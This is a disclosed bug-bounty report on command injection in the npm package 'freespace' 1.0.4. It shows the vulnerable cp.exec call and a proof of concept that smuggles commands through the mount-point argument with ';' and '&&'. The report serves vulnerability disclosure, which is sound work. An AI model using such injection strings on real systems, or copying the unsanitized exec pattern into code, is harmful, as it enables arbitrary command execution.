# [freespace] Command Injection due to Lack of Sanitization

## Report Details
- **Report ID**: 951249
- **URL**: https://hackerone.com/reports/951249
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-08-04T20:43:52.025Z
- **Disclosed**: 2020-10-14T15:50:41.478Z

## Reporter
- **Username**: ansuj7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report `Command Injection` in the `freespace` module.
It allows an attacker to inject and execute shell commands on Unix based systems.

# Module

**module name:** freespace
**version:** 1.0.4
**npm page:** `https://www.npmjs.com/package/freespace`

## Module Description

A library that tells you how much free disk space you have.  
- Works on all platform.
- No dependencies and no native libraries.

## Module Stats

[26] weekly downloads

# Vulnerability

## Vulnerability Description

The library offers a function that allows a developer to pass in a disk-label (Windows) or a mount-point (Linux) and returns space details about the same. However, due to lack of proper sanitization of the parameter to that function, injection of multiple commands using delimiters such as `;` and `&&` will cause the shell to interpret and execute each command between those characters.  
This code is vulnerable on the Unix platform and not on Windows. The Windows variant also directly uses the input without sanitization, however, uses only the first character of the input parameter, which prevents injection.

This is the vulnerable code in `index.js` of the library:
```javascript
exports.check = function(driveOrMount, callback) {
    return new Promise(function(resolve, reject) {
        let cb = function(err, stdout, stderr) { ... };
        if (!driveOrMountRegex.test(driveOrMount)) {
            let err = new Error(DRIVE_STRING_ERROR);
            if (callback) callback(err);
            return reject(err);
        }
        if (process.platform === 'win32') {
            driveOrMount = driveOrMount.charAt(0).toLowerCase();
            cp.exec(`fsutil volume diskfree ${driveOrMount}:`, {}, cb);
        } else {
            cp.exec(`df -P ${driveOrMount} | awk 'NR==2 {print $4}'`, {}, cb);  // vulnerability - 'driveOrMount' is being used directly without sanitization
        }
    }).then(function(bytes) { return bytes })
        .catch(function(err) { return Promise.reject(err) });
};
```


## Steps To Reproduce:

- Create test directory: `mkdir freespace-poc` and `cd` into it
- Install the library with NPM:  `npm install freespace`
- Create an output directory, I am using `/tmp` - which is initially empty
- Create a file `test.js` containing the following:

```javascript
const freespace = require('freespace');

freespace.check('/ ; touch /tmp/semicolon_file')
        .then(bytes => {
                console.log(bytes);
        });

freespace.check('/ && touch /tmp/ampersand_file')
        .then(bytes => {
                console.log(bytes);
        });
```
- Run the code: `node test.js`
- List the output directory - in my case, `ls /tmp`
- You will see that the files `semicolon_file` and `ampersand_file` have been created, indicating that the commands were injected and executed

{F936538}

## Patch

All parameters should be sanitized before being sent as shell command arguments. The developer has implemented a REGEX check before shell command calls in the line `if (!driveOrMountRegex.test(driveOrMount))` which does not cover these special cases. This REGEX can be used to whitelist/blacklist characters and either produce an error or strip them out and continue execution. 

## Supporting Material/References:

- Operating System Version: Ubuntu 18.04.4 LTS 
- NodeJS Version: v14.7.0
- NPM Version: 6.14.7

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

Thank you for your time.

## Impact

Command Injection can lead to information gathering, system enumeration and further execution of scripts/binaries.

## Attachments
- freespace-poc.PNG
